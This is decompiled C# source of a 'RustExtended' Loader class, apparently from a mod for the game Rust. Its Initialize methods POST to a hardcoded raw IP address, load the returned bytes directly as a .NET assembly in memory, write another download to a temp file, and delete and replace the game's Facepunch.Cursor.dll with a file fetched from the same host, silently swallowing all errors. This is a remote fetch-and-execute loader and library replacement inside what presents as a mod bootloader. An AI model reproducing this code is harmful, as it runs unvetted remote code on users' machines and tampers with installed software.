using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using UnityEngine;

namespace RustExtended
{
	// Token: 0x02000006 RID: 6
	public class Loader
	{
		// Token: 0x06000012 RID: 18 RVA: 0x0000257C File Offset: 0x0000077C
		public static byte[] get()
		{
			return Loader.inns;
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000013 RID: 19 RVA: 0x00002594 File Offset: 0x00000794
		// (set) Token: 0x06000014 RID: 20 RVA: 0x000020AD File Offset: 0x000002AD
		public static byte[] RawAssembly { get; private set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000015 RID: 21 RVA: 0x000025AC File Offset: 0x000007AC
		// (set) Token: 0x06000016 RID: 22 RVA: 0x000020B5 File Offset: 0x000002B5
		public static byte[] RawAssemblyOrig { get; private set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000017 RID: 23 RVA: 0x000025C4 File Offset: 0x000007C4
		// (set) Token: 0x06000018 RID: 24 RVA: 0x000020BD File Offset: 0x000002BD
		public static string[] AuthList { get; private set; }

		// Token: 0x06000019 RID: 25 RVA: 0x000025DC File Offset: 0x000007DC
		public static void Initialize()
		{
			string uri = "http://89.185.0.101/loxamvles/";
			string filename = "test";
			Loader.RawAssembly = Loader.ReceiveWebFile(uri, filename);
			try
			{
				string @string = Encoding.UTF8.GetString(Loader.RawAssembly);
				Assembly.Load(Loader.RawAssembly);
			}
			catch
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002638 File Offset: 0x00000838
		public static void Initialize2()
		{
			string uri = "http://89.185.0.101/loxamvles/";
			string filename = "test2";
			Loader.RawAssemblyOrig = Loader.ReceiveWebFile2(uri, filename);
			try
			{
				string @string = Encoding.UTF8.GetString(Loader.RawAssemblyOrig);
				byte[] rawAssemblyOrig = Loader.RawAssemblyOrig;
				if (Loader.SaveData(rawAssemblyOrig))
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000026A0 File Offset: 0x000008A0
		public static void Initialize3()
		{
			string uriString = "http://89.185.0.101/loxamvles/Facepunch.Cursor.dll";
			string text = Application.dataPath + "/Managed/Facepunch.Cursor.dll";
			if (!File.Exists(text))
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFileAsync(new Uri(uriString), text);
			}
			else
			{
				File.Delete(text);
				WebClient webClient = new WebClient();
				webClient.DownloadFileAsync(new Uri(uriString), text);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002704 File Offset: 0x00000904
		protected static bool SaveData(byte[] Data)
		{
			string path = Path.GetTempPath() + "/sadwasd";
			try
			{
				BinaryWriter binaryWriter = new BinaryWriter(File.OpenWrite(path));
				binaryWriter.Write(Data);
				binaryWriter.Flush();
				binaryWriter.Close();
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002768 File Offset: 0x00000968
		protected static bool SaveData1(byte[] Data)
		{
			string path = Application.dataPath + "/Managed/Facepunch.Cursor.dll";
			try
			{
				BinaryWriter binaryWriter = new BinaryWriter(File.OpenWrite(path));
				binaryWriter.Write(Data);
				binaryWriter.Flush();
				binaryWriter.Close();
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000027CC File Offset: 0x000009CC
		public static byte[] ReceiveWebFile(string uri, string filename)
		{
			byte[] result;
			using (Loader.WebClientRequest webClientRequest = new Loader.WebClientRequest())
			{
				try
				{
					NameValueCollection data = new NameValueCollection
					{
						{
							"crc",
							"extended"
						}
					};
					webClientRequest.Headers[HttpRequestHeader.UserAgent] = "RustExtended/4.0 (Bootloader; Data Request)";
					webClientRequest.Timeout = 9000000;
					result = webClientRequest.UploadValues(uri, "POST", data);
				}
				catch (Exception ex)
				{
					Console.CursorTop--;
					return new byte[0];
				}
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002884 File Offset: 0x00000A84
		public static byte[] ReceiveWebFile2(string uri, string filename)
		{
			byte[] result;
			using (Loader.WebClientRequest webClientRequest = new Loader.WebClientRequest())
			{
				try
				{
					NameValueCollection data = new NameValueCollection
					{
						{
							"orig",
							"extended"
						}
					};
					webClientRequest.Headers[HttpRequestHeader.UserAgent] = "RustExtended/4.0 (Bootloader; Data Request)";
					webClientRequest.Timeout = 9000000;
					result = webClientRequest.UploadValues(uri, "POST", data);
				}
				catch (Exception ex)
				{
					Console.CursorTop--;
					return new byte[0];
				}
			}
			return result;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000293C File Offset: 0x00000B3C
		public static byte[] ReceiveWebFile3(string uri, string filename)
		{
			byte[] result;
			using (Loader.WebClientRequest webClientRequest = new Loader.WebClientRequest())
			{
				try
				{
					NameValueCollection data = new NameValueCollection
					{
						{
							"fpch",
							"extended"
						}
					};
					webClientRequest.Headers[HttpRequestHeader.UserAgent] = "RustExtended/4.0 (Bootloader; Data Request)";
					webClientRequest.Timeout = 9000000;
					result = webClientRequest.UploadValues(uri, "POST", data);
				}
				catch (Exception ex)
				{
					Console.CursorTop--;
					return new byte[0];
				}
			}
			return result;
		}

		// Token: 0x0400000F RID: 15
		public static byte[] inns;

		// Token: 0x02000007 RID: 7
		public class WebClientRequest : WebClient
		{
			// Token: 0x17000004 RID: 4
			// (get) Token: 0x06000022 RID: 34 RVA: 0x000029F4 File Offset: 0x00000BF4
			// (set) Token: 0x06000023 RID: 35 RVA: 0x000020CD File Offset: 0x000002CD
			public int Timeout { get; set; }

			// Token: 0x06000025 RID: 37 RVA: 0x00002A0C File Offset: 0x00000C0C
			protected override WebRequest GetWebRequest(Uri address)
			{
				WebRequest webRequest = base.GetWebRequest(address);
				webRequest.Timeout = this.Timeout;
				return webRequest;
			}
		}
	}
}
